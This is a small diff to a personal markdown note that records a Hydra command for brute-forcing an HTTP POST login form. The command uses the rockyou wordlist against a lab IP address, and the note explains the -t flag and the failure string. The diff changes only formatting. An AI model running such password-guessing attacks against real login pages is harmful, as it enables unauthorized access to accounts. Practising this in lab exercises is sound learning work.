@@ -2,14 +2,16 @@
 
 > Shahrukh Tramboo | February 13th, 2022
 
---------------------------------------
+---
 
 **Commands**
 
-1.	form-post-data:
+1. form-post-data:
+
 ```bash
 hydra -l amdin -P /usr/share/wordlists/rockyou.txt 10.10.56.204 http-post-form <request-url with all params:params:Login Failed> -t 64
 ```
+
 -t → Number of tasks that can run in parallel.
 
 Login Failed -> When someone enters wrong credentials
